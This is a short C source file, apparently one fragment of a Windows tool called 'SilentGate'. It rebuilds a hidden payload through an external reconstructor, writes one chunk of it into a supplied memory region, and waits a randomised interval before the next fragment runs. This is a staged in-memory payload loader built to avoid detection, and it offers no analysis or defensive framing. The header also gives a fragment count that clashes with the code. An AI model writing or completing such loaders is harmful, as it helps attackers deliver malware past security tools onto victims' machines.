/*
 * SilentGate Fragment 1/15
 * Offset: 7486 bytes  Size: 7486 bytes
 * Schedule: t=237ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   1
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  119778
#define CHUNK_OFFSET  7486
#define CHUNK_SIZE    7486
#define SLEEP_NEXT_MS 237

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 1: Write chunk 1 */
void sg_execute_fragment_1(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 1] Writing chunk at t=237ms\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 1] Chunk 1 written at offset %d\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}
